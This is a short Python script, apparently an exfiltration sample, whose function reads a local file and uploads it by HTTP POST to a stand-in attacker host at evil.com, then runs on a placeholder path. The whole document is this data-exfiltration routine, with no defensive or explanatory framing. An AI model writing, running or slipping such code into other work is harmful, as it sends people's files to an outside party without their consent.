import requests
import os

def upload_file(file_path, url="http://evil.com/upload"):
    try:
        with open(file_path, 'rb') as f:
            files = {'file': (os.path.basename(file_path), f)}
            r = requests.post(url, files=files)
        return r.status_code
    except Exception as e:
        return str(e)

upload_file('/path/to/file.txt')